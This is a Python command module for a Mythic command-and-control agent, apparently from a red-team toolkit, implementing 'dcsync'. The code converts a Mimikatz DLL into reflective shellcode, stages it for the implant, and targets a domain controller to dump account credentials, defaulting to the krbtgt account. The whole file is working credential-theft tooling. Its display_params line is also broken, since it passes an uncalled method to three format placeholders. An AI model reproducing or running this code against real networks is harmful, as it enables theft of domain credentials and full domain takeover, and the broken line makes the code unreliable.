from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from mythic_payloadtype_container.MythicRPC import *


class DCSYNCArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "dc": CommandParameter(name="DC", type=ParameterType.String, default_value="", required=True, description="DC to target"),
            "domain": CommandParameter(name="Domain", type=ParameterType.String, default_value="", required=False, description="Domain to target (FQDN)"),
            "user": CommandParameter(name="User", type=ParameterType.String, default_value="krbtgt", required=True, description="Account to target (leave blank to dump all accounts)")
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("DCSYNC requires arguments.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)
        self.add_arg("pipe_name", str(uuid4()))


class DCSYNCCommand(CommandBase):
    cmd = "dcsync"
    needs_admin = False
    help_cmd = "dcsync (modal popup)"
    description = "Use the MS-DRSR protocol to dump account credentials from a Domain Controller."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = DCSYNCArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(converted_dll).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error)
        task.display_params = "/dc:{} /domain:{} /user:{}".format(self.args.get_arg)
        return task

    async def process_response(self, response: AgentResponse):
        pass
